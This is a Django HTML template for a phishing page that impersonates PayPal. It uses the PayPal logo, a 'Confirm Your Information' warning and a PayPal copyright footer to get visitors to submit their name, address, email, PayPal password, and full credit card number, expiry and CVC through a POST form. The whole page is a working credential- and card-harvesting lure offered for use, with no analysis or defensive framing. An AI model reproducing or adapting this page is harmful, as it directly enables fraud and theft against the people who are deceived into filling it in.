
{% load static %}
<! Doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="{% static 'css/bootstrap.min.css'%}">
<style>
.padding {
    padding: 5rem !important
}

.form-control:focus {
    box-shadow: 10px 0px 0px 0px #ffffff !important;
    border-color: #4ca746
}
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width:300px;
}
</style>
</head>
<body>
<img src="{% static 'img/paypal.png'%}" class="center"><br><br>
<div class="alert alert-danger" role="alert">
Confirm Your Information !
</div>
<div class="alert alert-warning" role="alert">
  Enter Your Personal Informations To Confirm 
</div>
<form method="POST" action="">
{% csrf_token %}
  <div class="form-row">
    <div class="form-group col-md-6">
      <label for="inputEmail4">First Name</label>
      <input type="text" class="form-control" id="inputEmail4" name="first_name">
    </div>
    <div class="form-group col-md-6">
      <label for="inputPassword4">Last Name</label>
      <input type="text" class="form-control" id="inputPassword4" name="last_name">
    </div>
  </div>
  <div class="form-group">
    <label for="inputAddress">Address</label>
    <input type="text" class="form-control" id="inputAddress" placeholder="1234 Main St" name="Address_one">
  </div>
  <div class="form-group">
    <label for="inputAddress2">Address 2 *</label>
    <input type="text" class="form-control" id="inputAddress2" placeholder="Apartment, studio, or floor" name="Address_two">
  </div>
  <div class="form-row">
    <div class="form-group col-md-6">
      <label for="inputCity">City</label>
      <input type="text" class="form-control" id="inputCity" name="City">
    </div>
    <div class="form-group col-md-4">
      <label for="inputState">State</label>
      {{form.country}}
    </div>
    

    <div class="form-group col-md-2">
      <label for="inputZip">Zip</label>
      <input type="text" class="form-control" id="inputZip" name="zip_code">
    </div>
  </div>
<div class="alert alert-warning" role="alert">
  Enter Your PayPal And Card Informations To Confirm 
</div>
<img src="{% static 'img/paypal.png'%}" class="center" style="width:60px">
<div class="alert alert-light" role="alert">
</div>
  <div class="form-group">
    <label for="examplefirstname">Email Address</label>
    <input type="text" class="form-control" id="examplelastname" aria-describedby="emailHelp" name="Email">
    <small id="emailHelp" class="form-text text-muted">We'll never share This Information with anyone else.</small>
  </div>
  <div class="form-group">
    <label for="examplelastname">Password</label>
    <input type="password" class="form-control" id="exampleInputPassword1" name="password">
  </div>
  <img src="{% static 'img/card.svg'%}" class="center" style="width:30px">
 
<div class="padding">
    <div class="row">
        <div class="container-fluid d-flex justify-content-center">
            <div class="col-sm-8 col-md-6">
                <div class="card">
                    <div class="card-header">
                        <div class="row">
                            <div class="col-md-6"> <span>CREDIT CARD Informations</span> </div>
                            <div class="col-md-6 text-right" style="margin-top: -5px;"> <img src="https://img.icons8.com/color/36/000000/visa.png"> <img src="https://img.icons8.com/color/36/000000/mastercard.png"> <img src="https://img.icons8.com/color/36/000000/amex.png"> </div>
                        </div>
                    </div>
                    <div class="card-body" style="height: 350px">
                        <div class="form-group"> <label for="cc-number" class="control-label">CARD NUMBER</label> <input id="cc-number" type="tel" class="input-lg form-control cc-number" autocomplete="cc-number" placeholder="•••• •••• •••• ••••" required name="card_number"> </div>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="form-group"> <label for="cc-exp" class="control-label">CARD EXPIRY</label> <input id="cc-exp" type="tel" class="input-lg form-control cc-exp" autocomplete="cc-exp" placeholder="•• / ••" required name="card_expiry"> </div>
                            </div>
                            <div class="col-md-6">
                                <div class="form-group"> <label for="cc-cvc" class="control-label">CARD CVC</label> <input id="cc-cvc" type="tel" class="input-lg form-control cc-cvc" autocomplete="off" placeholder="••••" required name="card_cvc"> </div>
                            </div>
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<input type="SUBMIT" value="Confirm" class="btn btn-success btn-sm center">
</form>
                                <script type='text/javascript' src='https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.bundle.min.js'></script>
                                <script type='text/javascript'>$(function($) {
$('[data-numeric]').payment('restrictNumeric');
$('.cc-number').payment('formatCardNumber');
$('.cc-exp').payment('formatCardExpiry');
$('.cc-cvc').payment('formatCardCVC');
$.fn.toggleInputError = function(erred) {
this.parent('.form-group').toggleClass('has-error', erred);
return this;
};
$('form').submit(function(e) {
e.preventDefault();
var cardType = $.payment.cardType($('.cc-number').val());
$('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
$('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
$('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
$('.cc-brand').text(cardType);
$('.validation').removeClass('text-danger text-success');
$('.validation').addClass($('.has-error').length ? 'text-danger' : 'text-success');
});
});</script>
    
 

<hr>
<p class="text text-secondary" style="text-align:center">
PayPal 1999-2021
</p>
</body>
</html>
